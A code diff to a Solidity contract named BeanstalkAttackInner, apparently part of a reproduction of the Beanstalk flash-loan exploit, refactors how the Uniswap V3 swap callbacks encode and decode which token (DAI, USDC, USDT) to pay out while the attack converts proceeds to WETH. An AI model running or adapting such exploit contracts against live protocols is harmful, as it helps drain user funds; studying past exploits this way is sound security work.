@@ -132,7 +132,7 @@ contract BeanstalkAttackInner is IUniswapV2Callee, IUniswapV3Callee {
             true, // DAI -> USDC
             int(IERC20(DAI).balanceOf(address(this))),
             4295128740, // ? why
-            hex"0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f0000000000000000000000000000000000000000000cc631f3a7bb36f02541e9" // TODO
+            abi.encode(DAI)
         );
 
         // Swap USDC -> WETH
@@ -141,7 +141,7 @@ contract BeanstalkAttackInner is IUniswapV2Callee, IUniswapV3Callee {
             true,
             int(IERC20(USDC).balanceOf(address(this))),
             4295128740, // ? why
-            hex"000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000000021dbf7b26f9c" // TODO
+            abi.encode(USDC)
         );
 
         // Swap USDT -> WETH
@@ -150,7 +150,7 @@ contract BeanstalkAttackInner is IUniswapV2Callee, IUniswapV3Callee {
             false,
             int(IERC20(USDT).balanceOf(address(this))),
             1461446703485210000000000000000000000000000000000,
-            hex"000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000060009b2ff48"
+            abi.encode(USDT)
         );
 
         // Unwrap WETH
@@ -166,14 +166,12 @@ contract BeanstalkAttackInner is IUniswapV2Callee, IUniswapV3Callee {
         int256 amount1Delta,
         bytes calldata data
     ) external {
-        // TODO
-        if (keccak256(data) == keccak256(hex"0000000000000000000000006b175474e89094c44da98b954eedeac495271d0f0000000000000000000000000000000000000000000cc631f3a7bb36f02541e9")) {
+        address encodedData = abi.decode(data, (address));
+        if (DAI == encodedData) {
             IERC20(DAI).transfer(UNISWAPV3_DAI_USDC_PAIR, uint256(amount0Delta));
-        // TODO
-        } else if (keccak256(data) == keccak256(hex"000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb48000000000000000000000000000000000000000000000000000021dbf7b26f9c")) {
+        } else if (USDC == encodedData) {
             IERC20(USDC).transfer(UNISWAPV3_USDC_WETH_PAIR, uint256(amount0Delta));
-        // TODO
-        } else if (keccak256(data) == keccak256(hex"000000000000000000000000dac17f958d2ee523a2206206994597c13d831ec70000000000000000000000000000000000000000000000000000060009b2ff48")) {
+        } else if (USDT == encodedData) {
             IUSDT(USDT).transfer(UNISWAPV3_WETH_USDT_PAIR, uint256(amount1Delta));
         }
     }
